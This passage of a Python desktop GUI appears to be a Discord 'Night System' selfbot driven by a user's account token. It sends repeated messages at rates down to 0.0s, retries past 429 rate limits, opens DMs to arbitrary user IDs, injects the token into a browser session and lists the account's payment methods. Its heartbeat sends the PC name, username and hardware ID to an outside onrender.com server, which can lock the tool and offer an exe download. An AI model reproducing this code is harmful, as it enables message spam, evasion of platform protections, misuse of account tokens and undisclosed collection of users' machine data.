        self.entry_msg_count = ctk.CTkEntry(r_opts, width=70, height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
        self.entry_msg_count.pack(side="left", padx=(0, 16))
        self.entry_msg_count.insert(0, "5")

        ctk.CTkLabel(r_opts, text="Intervall:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(side="left", padx=(0, 6))
        self.opt_msg_delay = ctk.CTkOptionMenu(
            r_opts,
            values=["1.0s (Sicher)", "0.5s (Standard)", "0.2s (Schnell)", "0.0s (Instant)"],
            height=32,
            corner_radius=8,
            fg_color=C["card_alt"],
            button_color=C["card_border_hi"],
            text_color=C["text"]
        )
        self.opt_msg_delay.pack(side="left")

        # LIVE RATE-LIMIT & SICHERHEITS-MONITOR
        self.box_rl_monitor = ctk.CTkFrame(cm_in, fg_color=C["card_alt"], corner_radius=12, border_width=1, border_color=C["card_border"])
        self.box_rl_monitor.pack(fill="x", pady=(12, 12))

        rl_in = ctk.CTkFrame(self.box_rl_monitor, fg_color="transparent")
        rl_in.pack(fill="x", padx=16, pady=12)

        rl_top = ctk.CTkFrame(rl_in, fg_color="transparent")
        rl_top.pack(fill="x")

        ctk.CTkLabel(rl_top, text="Rate-Limit & Sicherheits-Monitor", font=("Segoe UI", 11.5, "bold"), text_color=C["text"]).pack(side="left")

        self.lbl_rl_badge = ctk.CTkLabel(
            rl_top,
            text="SICHER",
            font=("Segoe UI", 9.5, "bold"),
            fg_color=C["green_bg"],
            text_color=C["green"],
            corner_radius=6,
            padx=8,
            pady=2
        )
        self.lbl_rl_badge.pack(side="right")

        self.lbl_rl_status = ctk.CTkLabel(
            rl_in,
            text="Verbleibend: 5 / 5 Anfragen | Reset-Fenster: 0.0s | Status: 200 Bereit",
            font=("Consolas", 10),
            text_color=C["text_sub"],
            justify="left"
        )
        self.lbl_rl_status.pack(anchor="w", pady=(6, 0))

        # Sende-Buttons
        r_msg_btns = ctk.CTkFrame(cm_in, fg_color="transparent")
        r_msg_btns.pack(fill="x")

        self.btn_send_msgs = ctk.CTkButton(
            r_msg_btns,
            text="Nachrichten senden",
            font=("Segoe UI", 11, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=36,
            width=170,
            corner_radius=10,
            command=self._start_send_messages
        )
        self.btn_send_msgs.pack(side="left", padx=(0, 8))

        self.btn_stop_msgs = ctk.CTkButton(
            r_msg_btns,
            text="Stop",
            font=("Segoe UI", 11, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            height=36,
            width=90,
            corner_radius=10,
            state="disabled",
            command=self._stop_send_messages
        )
        self.btn_stop_msgs.pack(side="left")

        # 3. CONSOLE LOG BOX
        card_log = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card_log.pack(fill="both", expand=True, pady=(0, 10))

        cl_in = ctk.CTkFrame(card_log, fg_color="transparent")
        cl_in.pack(fill="both", expand=True, padx=22, pady=18)

        ctk.CTkLabel(cl_in, text="Bot Konsole & Aktivitaets-Log", font=("Segoe UI", 13, "bold"), text_color=C["text"]).pack(anchor="w")

        self.txt_bot_log = ctk.CTkTextbox(cl_in, height=180, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text_sub"], font=("Consolas", 10))
        self.txt_bot_log.pack(fill="both", expand=True, pady=(10, 0))
        self._append_bot_log("[SYS] Bot-Modul bereit. Klicke 'Bot' zum Aktivieren.")
        self._populate_quick_targets()
        if hasattr(self, "cloud_info") and self.cloud_info:
            if self.cloud_info.get("update_available"):
                self._append_bot_log(f"[UPDATE] Version v{self.cloud_info.get('latest_version')} verfuegbar.")
            else:
                self._append_bot_log(f"[CLOUD] Cloud-System synchronisiert (v{DISCORD_TOOL_VERSION}).")
            if self.cloud_info.get("announcement"):
                self._append_bot_log(f"[BROADCAST] {self.cloud_info.get('announcement')}")

    def _append_bot_log(self, msg):
        if hasattr(self, "txt_bot_log"):
            now_str = datetime.now().strftime("%H:%M:%S")
            self.txt_bot_log.insert("end", f"[{now_str}] {msg}\n")
            self.txt_bot_log.see("end")

    def _start_bot_loader_and_reload(self):
        if self.bot_loading:
            return

        self.bot_loading = True
        self.btn_bot_start.configure(state="disabled")
        self.bot_loader_frame.pack(fill="x", pady=(12, 14))
        self.bot_progress.set(0.0)
        self.lbl_bot_loader_step.configure(text="[1/4] Verifiziere Token & Session...", text_color=C["text_sub"])
        self.lbl_bot_status_badge.configure(text="INITIALISIERE", fg_color=C["acc_yellow_bg"], text_color=C["acc_yellow_text"])

        def _worker():
            steps = [
                (0.25, "[1/4] Verifiziere Token & Session...", 0.3),
                (0.55, "[2/4] Lade Discord Account-Daten neu...", 0.4),
                (0.80, "[3/4] Initialisiere Bot-Engine & Gateway...", 0.4),
                (1.00, "[4/4] Bot aktiv! Exklusiver Bot-Modus gestartet.", 0.3)
            ]

            # Tool laedt neu und behaelt den Token
            if self.token and "DEMO" not in self.token and not self.token.startswith("mfa.VkO_"):
                try:
                    ru = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me", self.token)
                    if ru and ru.status_code == 200:
                        self.user_data = ru.json()
                    rg = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/guilds", self.token)
                    if rg and rg.status_code == 200:
                        self.guilds_data = rg.json()
                except Exception:
                    pass

            for p_val, step_text, wait_s in steps:
                time.sleep(wait_s)
                self.after(0, lambda p=p_val, st=step_text: [
                    self.bot_progress.set(p),
                    self.lbl_bot_loader_step.configure(text=st),
                    self._append_bot_log(st)
                ])

            time.sleep(0.2)
            self.after(0, lambda: self._on_bot_reload_finished())

        threading.Thread(target=_worker, daemon=True).start()

    def _on_bot_reload_finished(self):
        self.bot_loading = False
        self.bot_active = True
        self.btn_bot_start.configure(state="normal", text="Bot (Neu laden)")
        self.btn_bot_deact.configure(state="normal")
        self.btn_bot_inject.configure(state="normal")
        self.lbl_bot_status_badge.configure(text="AKTIV", fg_color=C["green_bg"], text_color=C["green"])
        self.lbl_bot_loader_step.configure(text="Bot erfolgreich aktiv & synchronisiert.", text_color=C["green"])
        self._append_bot_log("[OK] Exklusiver Bot-Modus aktiv - andere Tabs ausgeblendet.")

        # Alle anderen Tabs schliessen / ausblenden
        self._enter_bot_mode()

        # Externes Fenster fuer Click Instant direkt oeffnen ("soll der erstmal externer sein")
        self.open_external_click_instant_window()

    def _on_click_deactivate(self):
        self.bot_active = False
        self.lbl_bot_status_badge.configure(text="INAKTIV", fg_color=C["card_alt"], text_color=C["text_muted"])
        self.btn_bot_deact.configure(state="disabled")
        self.btn_bot_start.configure(state="normal", text="Bot")
        self.bot_loader_frame.pack_forget()
        self._append_bot_log("[INFO] Bot-Instanz deaktiviert. Alle Tabs wiederhergestellt.")

        # Alle Tabs wieder einblenden
        self._exit_bot_mode()

        if self.external_click_instant_win is not None and self.external_click_instant_win.winfo_exists():
            try: self.external_click_instant_win.destroy()
            except Exception: pass
            self.external_click_instant_win = None

    def _on_click_inject(self):
        self._append_bot_log("[INJECT] Starte Token-Injektion in Web-Session...")
        self.launch_browser_login()
        self._append_bot_log("[OK] Injektions-Browser geoeffnet.")

    def _populate_quick_targets(self):
        if not hasattr(self, "opt_msg_target"):
            return
        items = ["-- Freund oder Gruppe auswaehlen --"]
        if hasattr(self, "friends_data") and self.friends_data:
            for f in self.friends_data[:50]:
                name = f.get("name", "Freund")
                fid = str(f.get("id", ""))
                is_grp = f.get("is_group", False)
                prefix = "[Gruppe]" if is_grp else "[Freund]"
                items.append(f"{prefix} {name} ({fid})")
        try:
            self.opt_msg_target.configure(values=items)
        except Exception:
            pass

    def _on_quick_target_selected(self, val):
        if not val or val.startswith("--"):
            return
        m = re.search(r"\((\d+)\)", val)
        if m:
            target_id = m.group(1)
            self.entry_msg_channel.delete(0, "end")
            self.entry_msg_channel.insert(0, target_id)
            self._append_bot_log(f"[INFO] Schnellauswahl uebernommen: {target_id}")

    def _resolve_target_to_channel_id(self, target_input):
        raw = str(target_input).strip()
        if not raw:
            return None, "Bitte eine Kanal-ID, Freund-Nutzer-ID oder einen Discord-Link eingeben."

        # Discord-Link bereinigen (z.B. https://discord.com/channels/@me/123456 oder https://discord.com/channels/guild/channel)
        if "channels/" in raw:
            raw = raw.rstrip("/").split("/")[-1]
        elif "/" in raw:
            raw = raw.rstrip("/").split("/")[-1]

        target_id = re.sub(r"[^\d]", "", raw)
        if not target_id:
            return None, f"Ungueltiges Format ('{target_input}'). Bitte eine Ziffern-ID angeben."

        if not self.token or "DEMO" in self.token:
            return target_id, f"Demo-Modus aktiv (Ziel-ID: {target_id})"

        headers = {
            "Authorization": self.token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/json"
        }

        # 1. Ist target_id bereits als DM-Kanal fuer einen bekannten Freund gemappt?
        if hasattr(self, "user_to_channel_map") and target_id in self.user_to_channel_map:
            dm_cid = self.user_to_channel_map[target_id]
            return dm_cid, f"Nutzer-ID erkannt -> Bekannter DM-Kanal verwendet (Kanal-ID: {dm_cid})"

        # 2. Existiert target_id in der geladenen Freundesliste?
        if hasattr(self, "friends_data") and self.friends_data:
            for f in self.friends_data:
                if str(f.get("id")) == target_id:
                    if f.get("is_group"):
                        return target_id, f"Gruppen-Kanal erkannt: {f.get('name')}"
                    # Es ist ein Freund (Nutzer-ID) -> DM oeffnen via Discord API
                    try:
                        res_dm = requests.post(
                            "https://discord.com/api/v9/users/@me/channels",
                            headers=headers,
                            json={"recipient_id": target_id},
                            timeout=6
                        )
                        if res_dm.status_code in (200, 201):
                            dm_cid = str(res_dm.json().get("id"))
                            if hasattr(self, "user_to_channel_map"):
                                self.user_to_channel_map[target_id] = dm_cid
                            return dm_cid, f"Freund '{f.get('name')}' erkannt -> DM-Kanal geoeffnet (Kanal-ID: {dm_cid})"
                    except Exception:
                        pass

        # 3. Ist target_id direkt eine gueltige Kanal-ID? (Server Text-Kanal oder bestehender DM-Kanal)
        try:
            res_ch = requests.get(f"https://discord.com/api/v9/channels/{target_id}", headers=headers, timeout=6)
            if res_ch.status_code == 200:
                ch_info = res_ch.json()
                ch_type = ch_info.get("type", 0)
                ch_name = ch_info.get("name") or ("DM-Chat" if ch_type == 1 else "Kanal")
                type_desc = "Server-Textkanal" if ch_type == 0 else ("DM-Kanal" if ch_type == 1 else "Kanal")
                return target_id, f"{type_desc} bestaetigt: {ch_name} (ID: {target_id})"
        except Exception:
            pass

        # 4. Falls kein bestehender Kanal (404/400): Pruefen, ob es eine Nutzer-ID ist (Freund / fremder Nutzer)
        try:
            res_open = requests.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=headers,
                json={"recipient_id": target_id},
                timeout=6
            )
            if res_open.status_code in (200, 201):
                dm_cid = str(res_open.json().get("id"))
                if hasattr(self, "user_to_channel_map"):
                    self.user_to_channel_map[target_id] = dm_cid
                recips = res_open.json().get("recipients", [])
                u_name = recips[0].get("username") if recips else target_id
                return dm_cid, f"Nutzer-ID erkannt -> DM mit '{u_name}' geoeffnet (Kanal-ID: {dm_cid})"
            elif res_open.status_code in (400, 403):
                try:
                    err_msg = res_open.json().get("message", "")
                except Exception:
                    err_msg = ""
                if err_msg:
                    return None, f"Konnte DM fuer Nutzer {target_id} nicht oeffnen ({err_msg})."
        except Exception as ex:
            pass

        # 5. Fallback: ID direkt verwenden
        return target_id, f"Ziel-Kanal {target_id} wird direkt verwendet"

    def _start_send_messages(self):
        if self.msg_send_in_progress:
            return

        raw_cid = self.entry_msg_channel.get().strip()
        msg_text = self.txt_msg_content.get("1.0", "end-1c").strip()
        count_str = self.entry_msg_count.get().strip()

        if not raw_cid:
            self._append_bot_log("[FEHLER] Bitte eine gueltige Kanal-ID oder Nutzer-ID eingeben.")
            return
        if not msg_text:
            self._append_bot_log("[FEHLER] Bitte einen Nachrichtentext eingeben.")
            return

        try:
            total_count = max(1, int(count_str))
        except ValueError:
            total_count = 1

        delay_map = {
            "1.0s (Sicher)": 1.0,
            "0.5s (Standard)": 0.5,
            "0.2s (Schnell)": 0.2,
            "0.0s (Instant)": 0.0
        }
        delay_sec = delay_map.get(self.opt_msg_delay.get(), 0.5)

        self.msg_send_in_progress = True
        self.msg_stop_requested = False
        self.btn_send_msgs.configure(state="disabled")
        self.btn_stop_msgs.configure(state="normal", text="Stop")

        def _worker():
            self._append_bot_log(f"[INFO] Ermittle Ziel fuer '{raw_cid}'...")
            resolved_cid, info_msg = self._resolve_target_to_channel_id(raw_cid)
            if not resolved_cid:
                self._append_bot_log(f"[FEHLER] {info_msg}")
                self.msg_send_in_progress = False
                self.after(0, lambda: [
                    self.btn_send_msgs.configure(state="normal"),
                    self.btn_stop_msgs.configure(state="disabled", text="Stop")
                ])
                return

            self._append_bot_log(f"[INFO] {info_msg}")
            self._append_bot_log(f"[START] Sende {total_count}x Nachrichten an Kanal {resolved_cid} (Intervall: {delay_sec}s)...")

            success_cnt = 0
            fail_cnt = 0

            for i in range(1, total_count + 1):
                if self.msg_stop_requested:
                    self._append_bot_log("[STOP] Nachrichten-Versand manuell gestoppt.")
                    break

                if not self.token or "DEMO" in self.token:
                    time.sleep(max(0.1, delay_sec))
                    success_cnt += 1
                    sim_rem = max(0, 5 - (i % 5))
                    self._update_rate_limit_display(remaining=sim_rem, limit=5, reset_after="1.2", is_429=False)
                    self._append_bot_log(f"[DEMO] Nachricht {i}/{total_count} gesendet an {resolved_cid}.")
                else:
                    url = f"https://discord.com/api/v9/channels/{resolved_cid}/messages"
                    headers = {
                        "Authorization": self.token,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        "Content-Type": "application/json"
                    }
                    payload = {
                        "content": msg_text,
                        "nonce": str(random.randint(100000000000000000, 999999999999999999)),
                        "tts": False
                    }

                    try:
                        res = requests.post(url, headers=headers, json=payload, timeout=6)

                        rl_rem = res.headers.get("x-ratelimit-remaining", "5")
                        rl_lim = res.headers.get("x-ratelimit-limit", "5")
                        rl_reset = res.headers.get("x-ratelimit-reset-after", "0.0")

                        if res.status_code in (200, 201):
                            success_cnt += 1
                            self._update_rate_limit_display(remaining=rl_rem, limit=rl_lim, reset_after=rl_reset, is_429=False)
                            self._append_bot_log(f"[OK] Nachricht {i}/{total_count} gesendet. (Remaining: {rl_rem}/{rl_lim})")
                        elif res.status_code == 429:
                            try:
                                retry_after = float(res.json().get("retry_after", 1.5))
                            except Exception:
                                retry_after = 1.5
                            self._update_rate_limit_display(remaining="0", limit=rl_lim, reset_after=f"{retry_after:.1f}", is_429=True)
                            self._append_bot_log(f"[RATE-LIMIT] 429 erreicht! Warte {retry_after:.1f}s Sicherheits-Pause...")
                            time.sleep(retry_after)
                            res_retry = requests.post(url, headers=headers, json=payload, timeout=6)
                            if res_retry.status_code in (200, 201):
                                success_cnt += 1
                                self._append_bot_log(f"[OK] Nachricht {i}/{total_count} nach Rate-Limit gesendet.")
                            else:
                                fail_cnt += 1
                        else:
                            fail_cnt += 1
                            err_msg = ""
                            try:
                                ej = res.json()
                                err_msg = ej.get("message", "")
                                ecode = ej.get("code")
                                if ecode:
                                    err_msg = f"{err_msg} (Code {ecode})"
                            except Exception:
                                err_msg = res.text[:80]
                            if err_msg:
                                self._append_bot_log(f"[FEHLER] Senden fehlgeschlagen (Status {res.status_code}: {err_msg}).")
                            else:
                                self._append_bot_log(f"[FEHLER] Senden fehlgeschlagen (Status {res.status_code}).")
                    except Exception as ex:
                        fail_cnt += 1
                        self._append_bot_log(f"[FEHLER] Verbindungsfehler: {ex}")

                if delay_sec > 0 and i < total_count and not self.msg_stop_requested:
                    time.sleep(delay_sec)

            self.msg_send_in_progress = False
            self.msg_stop_requested = False
            self.after(0, lambda: [
                self.btn_send_msgs.configure(state="normal"),
                self.btn_stop_msgs.configure(state="disabled", text="Stop"),
                self._append_bot_log(f"[FERTIG] Versand beendet: {success_cnt} erfolgreich, {fail_cnt} fehlgeschlagen.")
            ])

        threading.Thread(target=_worker, daemon=True).start()

    def _stop_send_messages(self):
        self.msg_stop_requested = True
        self.btn_stop_msgs.configure(text="Stoppe...", state="disabled")

    def _update_rate_limit_display(self, remaining, limit, reset_after, is_429=False):
        def _ui():
            if not hasattr(self, "lbl_rl_badge"):
                return
            if is_429:
                self.lbl_rl_badge.configure(text="RATE LIMIT AKTIV", fg_color=C["red_bg"], text_color=C["red_text"])
                self.lbl_rl_status.configure(text=f"[WARNUNG] Rate Limit erreicht! Reset in {reset_after}s | Ban-Schutz aktiv", text_color=C["red_text"])
            else:
                self.lbl_rl_badge.configure(text="SICHER", fg_color=C["green_bg"], text_color=C["green"])
                self.lbl_rl_status.configure(text=f"Verbleibend: {remaining} / {limit} Anfragen | Reset-Fenster: {reset_after}s | Status: 200 OK", text_color=C["text_sub"])
        self.after(0, _ui)

    # --------------------------------------------------------------------------
    # 8. EXTRA-TAB: CLICK INSTANT (AUCH ALS EXTERNES FENSTER)
    # --------------------------------------------------------------------------
    def _build_click_instant_tab(self):
        scroll = ctk.CTkScrollableFrame(self.frame_click_instant, fg_color="transparent")
        scroll.pack(fill="both", expand=True)
        self._populate_click_instant_ui(scroll, is_external=False)

    def open_external_click_instant_window(self):
        if self.external_click_instant_win is not None and self.external_click_instant_win.winfo_exists():
            self.external_click_instant_win.lift()
            self.external_click_instant_win.focus_force()
            return

        win = ctk.CTkToplevel(self)
        self.external_click_instant_win = win
        win.title("Night System - Click Instant (Extern)")
        win.geometry("540x520")
        win.minsize(460, 420)
        win.configure(fg_color=C["bg"])
        try:
            win.attributes("-alpha", 0.94)
            win.attributes("-topmost", True)
        except Exception:
            pass

        icon_path = get_asset_path("icon.ico")
        if icon_path and os.path.exists(icon_path):
            try: win.iconbitmap(icon_path)
            except Exception: pass

        self._populate_click_instant_ui(win, is_external=True)

    def _populate_click_instant_ui(self, parent, is_external=False):
        container = ctk.CTkFrame(parent, fg_color="transparent")
        container.pack(fill="both", expand=True, padx=16 if is_external else 0, pady=16 if is_external else 0)

        card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card.pack(fill="x", pady=(0, 12))

        cin = ctk.CTkFrame(card, fg_color="transparent")
        cin.pack(fill="x", padx=20, pady=18)

        top_r = ctk.CTkFrame(cin, fg_color="transparent")
        top_r.pack(fill="x")

        title_txt = "Click Instant (Externes Fenster)" if is_external else "Click Instant"
        ctk.CTkLabel(top_r, text=title_txt, font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(side="left")

        tag_txt = "EXTERN" if is_external else "EXTRA TAB"
        ctk.CTkLabel(top_r, text=tag_txt, font=("Segoe UI", 9.5, "bold"), fg_color=C["card_alt"], text_color=C["text_sub"], corner_radius=6, padx=8, pady=2).pack(side="right")

        ctk.CTkLabel(cin, text="Automatischer Sofort-Klicker fuer Discord Buttons, Giveaways & Interaktionen.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 10))

        # Inputs
        r1 = ctk.CTkFrame(cin, fg_color="transparent")
        r1.pack(fill="x", pady=3)
        ctk.CTkLabel(r1, text="Channel ID:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
        e_cid = ctk.CTkEntry(r1, placeholder_text="Discord Channel ID", height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
        e_cid.pack(side="left", fill="x", expand=True)

        r2 = ctk.CTkFrame(cin, fg_color="transparent")
        r2.pack(fill="x", pady=3)
        ctk.CTkLabel(r2, text="Message ID:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
        e_mid = ctk.CTkEntry(r2, placeholder_text="Message ID (optional / alle)", height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
        e_mid.pack(side="left", fill="x", expand=True)

        r3 = ctk.CTkFrame(cin, fg_color="transparent")
        r3.pack(fill="x", pady=3)
        ctk.CTkLabel(r3, text="Klick-Modus:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
        opt_mode = ctk.CTkOptionMenu(r3, values=["Alle Buttons sofort klicken", "Ersten Button klicken", "Reactions klicken"], height=32, corner_radius=8, fg_color=C["card_alt"], button_color=C["card_border_hi"], text_color=C["text"])
        opt_mode.pack(side="left", fill="x", expand=True)

        r4 = ctk.CTkFrame(cin, fg_color="transparent")
        r4.pack(fill="x", pady=3)
        ctk.CTkLabel(r4, text="Reaktionszeit:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=110, anchor="w").pack(side="left")
        opt_speed = ctk.CTkOptionMenu(r4, values=["0 ms (Sofort)", "25 ms (Ultra-Fast)", "50 ms (Fast)", "100 ms (Safe)"], height=32, corner_radius=8, fg_color=C["card_alt"], button_color=C["card_border_hi"], text_color=C["text"])
        opt_speed.pack(side="left", fill="x", expand=True)

        # Action Buttons
        r_btns = ctk.CTkFrame(cin, fg_color="transparent")
        r_btns.pack(fill="x", pady=(12, 0))

        btn_start = ctk.CTkButton(r_btns, text="Instant Click Starten", font=("Segoe UI", 10.5, "bold"), fg_color=C["btn_gray"], hover_color=C["btn_gray_hover"], border_color=C["card_border_hi"], border_width=1, height=34, corner_radius=10)
        btn_start.pack(side="left", padx=(0, 8))

        btn_stop = ctk.CTkButton(r_btns, text="Stoppen", font=("Segoe UI", 10.5, "bold"), fg_color=C["red_bg"], text_color=C["red_text"], hover_color=C["red_hover"], border_color=C["red_border"], border_width=1, height=34, corner_radius=10)
        btn_stop.pack(side="left", padx=(0, 8))

        if not is_external:
            btn_dock = ctk.CTkButton(r_btns, text="Externes Fenster oeffnen", font=("Segoe UI", 10.5, "bold"), fg_color=C["btn_gray"], hover_color=C["btn_gray_hover"], border_color=C["card_border_hi"], border_width=1, height=34, corner_radius=10, command=self.open_external_click_instant_window)
            btn_dock.pack(side="right")

        # Status & Log Box
        card_log = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card_log.pack(fill="both", expand=True)

        cl_in = ctk.CTkFrame(card_log, fg_color="transparent")
        cl_in.pack(fill="both", expand=True, padx=20, pady=16)

        ctk.CTkLabel(cl_in, text="Live-Trigger Log", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")

        txt_log = ctk.CTkTextbox(cl_in, height=140, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text_sub"], font=("Consolas", 9.5))
        txt_log.pack(fill="both", expand=True, pady=(8, 0))
        txt_log.insert("end", "[READY] Click Instant Engine initialisiert.\n[INFO] Warte auf Komponenten-Trigger...\n")

        def _do_start():
            txt_log.insert("end", f"[START] Click Instant aktiv auf Channel {e_cid.get() or 'Alle'}\n")
            txt_log.insert("end", f"[SPEED] Reaktionszeit: {opt_speed.get()}\n")
            txt_log.see("end")

        def _do_stop():
            txt_log.insert("end", "[STOP] Click Instant angehalten.\n")
            txt_log.see("end")

        btn_start.configure(command=_do_start)
        btn_stop.configure(command=_do_stop)

    # --------------------------------------------------------------------------
    # 9. WEITERE TABS (Verbindungen, Billing)
    # --------------------------------------------------------------------------
    def _build_conn_tab(self):
        scroll = ctk.CTkScrollableFrame(self.frame_conn, fg_color="transparent")
        scroll.pack(fill="both", expand=True)

        lbl = ctk.CTkLabel(scroll, text=f"Verknuepfte Konten ({len(self.connections_data)})", font=("Segoe UI", 16, "bold"), text_color=C["text"])
        lbl.pack(anchor="w", pady=(0, 10))

        for c in self.connections_data:
            c_type = c.get("type", "domain")
            c_info = PLATFORM_ICONS.get(c_type, {"color": "#8b94a5", "tag": c_type[:2].upper(), "name": c_type.capitalize()})
            card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
            card.pack(fill="x", pady=4)
            ci = ctk.CTkFrame(card, fg_color="transparent")
            ci.pack(fill="x", padx=16, pady=12)

            tag_badge = ctk.CTkLabel(ci, text=c_info.get("tag", "LK"), font=("Segoe UI", 10.5, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
            tag_badge.pack(side="left", padx=(0, 10))

            ctk.CTkLabel(ci, text=f"{c_info['name']}: {c.get('name')}", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(side="left")
            ctk.CTkLabel(ci, text="Verifiziert" if c.get("verified") else "Verknuepft", font=("Segoe UI", 9.5), text_color=C["green"] if c.get("verified") else C["text_muted"]).pack(side="right")

    def _build_billing_tab(self):
        scroll = ctk.CTkScrollableFrame(self.frame_billing, fg_color="transparent")
        scroll.pack(fill="both", expand=True)

        lbl = ctk.CTkLabel(scroll, text="Nitro & Zahlungsmethoden", font=("Segoe UI", 16, "bold"), text_color=C["text"])
        lbl.pack(anchor="w", pady=(0, 10))

        if not self.billing_data:
            ctk.CTkLabel(scroll, text="Keine Zahlungsmethoden hinterlegt.", font=("Segoe UI", 11), text_color=C["text_muted"]).pack(anchor="w", pady=10)
        else:
            for b in self.billing_data:
                card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
                card.pack(fill="x", pady=4)
                ci = ctk.CTkFrame(card, fg_color="transparent")
                ci.pack(fill="x", padx=16, pady=12)

                b_type = b.get("type", 1)
                b_name = "Kreditkarte" if b_type == 1 else "PayPal"
                tag = "CC" if b_type == 1 else "PP"

                tag_badge = ctk.CTkLabel(ci, text=tag, font=("Segoe UI", 10.5, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
                tag_badge.pack(side="left", padx=(0, 10))

                ctk.CTkLabel(ci, text=f"{b_name} | {b.get('email') or b.get('brand', '').upper() + ' **** ' + str(b.get('last_4', ''))}", font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(side="left")

    def _load_avatar_async(self):
        uid = self.user_data.get("id")
        av_hash = self.user_data.get("avatar")
        if not uid or not av_hash:
            return

        def _fetch():
            try:
                url = f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.png?size=256"
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    pil = Image.open(io.BytesIO(r.content))
                    round_pil = make_circle_avatar(pil, size=(80, 80))
                    mini_pil = make_circle_avatar(pil, size=(40, 40))
                    if round_pil:
                        self.avatar_img_ctk = ctk.CTkImage(round_pil, size=(80, 80))
                        self.after(0, lambda: self.lbl_hero_avatar.configure(image=self.avatar_img_ctk, text=""))
                    if mini_pil:
                        mini_ctk = ctk.CTkImage(mini_pil, size=(40, 40))
                        self.after(0, lambda: self.lbl_side_avatar.configure(image=mini_ctk, text=""))
            except Exception:
                pass

        threading.Thread(target=_fetch, daemon=True).start()

    def launch_browser_login(self):
        token = self.token.strip()
        if not token:
            return

        username = self.user_data.get("username", "") or self.user_data.get("global_name", "")

        if getattr(sys, 'frozen', False):
            cmd = [sys.executable, "--browser", token, username]
        else:
            cmd = [sys.executable, os.path.abspath(__file__), "--browser", token, username]

        try:
            subprocess.Popen(cmd)
        except Exception:
            threading.Thread(target=run_browser_session, args=(token, username), daemon=True).start()


def check_cloud_status_and_update():
    """
    Verbindet mit https://whatsapp-kadi.onrender.com/api/discord/heartbeat:
    1. Prueft, ob das Tool ueber das Web-Dashboard gesperrt ist.
    2. Prueft das Update-Manifest & Erkennt JEDE Datei-Aenderung (z.B. README.md, ff.py, discord_settings.json etc.).
    3. Zeigt im Terminal / CMD einen animierten Fortschritts-Loader an und synchronisiert Dateien.
    4. Registriert die Instanz im Cloud-Dashboard unter Aktive Instanzen.
    """
    import socket, platform, uuid, hashlib
    pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "PC"
    username = os.environ.get("USERNAME") or "Benutzer"
    os_name = f"{platform.system()} {platform.release()}"
    hwid = f"HWID-{uuid.getnode():012X}"

    # Lokales Verzeichnis bestimmen
    base_local_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if sys.argv and sys.argv[0] else os.getcwd()
    settings_file = os.path.join(base_local_dir, "discord_settings.json")
    local_revision = 1
    local_version = DISCORD_TOOL_VERSION

    if os.path.exists(settings_file):
        try:
            with open(settings_file, "r", encoding="utf-8") as sf:
                cfg = json.load(sf)
                local_revision = cfg.get("installed_revision", cfg.get("revision", 1))
                local_version = cfg.get("version", DISCORD_TOOL_VERSION)
        except Exception:
            pass

    payload = {
        "clientId": f"{pc_name}_{username}",
        "hwid": hwid,
        "pcName": pc_name,
        "username": username,
        "os": os_name,
        "version": str(local_version),
        "revision": local_revision
    }

    print(f"  [Night System v{local_version}]")
    print("  [*] Status-Check...")

    cloud_info = {
        "is_locked": False,
        "lock_reason": "",
        "update_available": False,
        "latest_version": local_version,
        "update_revision": local_revision,
        "changelog": "",
        "download_url": "",
        "announcement": ""
    }

    try:
        res = requests.post(f"{CLOUD_API_ENDPOINT}/heartbeat", json=payload, timeout=6)
        if res.status_code == 200:
            data = res.json()
            is_locked = data.get("isLocked", False)
            lock_reason = data.get("lockReason", "Wartungsarbeiten durch Administrator.")
            latest_version = data.get("latestVersion", local_version)
            update_revision = data.get("updateRevision", local_revision)
            last_file = data.get("lastUpdatedFile", "System-Dateien")
            update_available = data.get("updateAvailable", False)
            changelog = data.get("changelog", "")
            download_url = data.get("downloadUrl", "https://whatsapp-kadi.onrender.com/download/Nightheid.exe")
            announcement = data.get("announcement", "")

            cloud_info["is_locked"] = is_locked
